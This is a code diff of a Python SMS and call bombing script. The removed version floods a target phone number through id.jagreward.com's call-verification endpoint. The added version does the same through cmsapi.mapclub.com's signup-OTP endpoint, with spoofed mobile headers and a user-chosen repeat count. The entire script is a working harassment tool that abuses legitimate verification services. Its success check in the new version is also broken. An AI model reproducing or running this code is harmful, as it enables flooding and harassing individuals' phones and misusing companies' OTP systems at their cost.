@@ -1,27 +1,41 @@
-# module
-import os,sys,time,requests
-from time import sleep
+import json
+import requests
+import os
+import sys
 
-# tampilan
-os.system("clear")
-sleep(1)
-os.system("figlet SpamCall")
-banner= """
-[•]───────────────────────────────────────────[•]
- | [+]  Author  : KayesSec1337		       |
- | [+]  TEAM    : #FORSDEATHTEAM            |
- | [+]  Facebook : KayessZuckerberg		       |
-[•]───────────────────────────────────────────[•]"""
-sleep(1)
-print(banner)
-nomor = input("Nomor Target: ")
-jumlah = int(input("Jumlah Spam: "))
 
-url = "https://id.jagreward.com/member/verify-mobile/"
-ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
-dat = {"method": "CALL","countryCode": "id",}
+def main():
+	os.system('clear')
+	os.system('figlet spamPriv')
+	banner='''
 
-for i in range(jumlah):
-    send = requests.post(url+nomor, headers=ua, data=dat)
-    print(" [•] Status ~+> ",(send.json()["message"]))
+	[+]AUTHOR:kayesSec1337
+	[+] Facebook:KayessZuckerberg
+	'''
+	print(banner)
+	no = input(' target : ')
+	jum = input('Jumlah spam : ')
 
+
+	head = {
+	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+	"Referer": "https://www.mapclub.com/en/user/signup",
+	"Host": "cmsapi.mapclub.com",
+	}
+
+
+	dat = {
+	'phone': no
+	}
+
+	for x in range (int(jum)):
+		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+		if 'eror' in leosureo:
+			print('gagal Mengirim ' + no)
+
+		else:
+			print('succes mengirim ' + no)
+
+
+
+main()
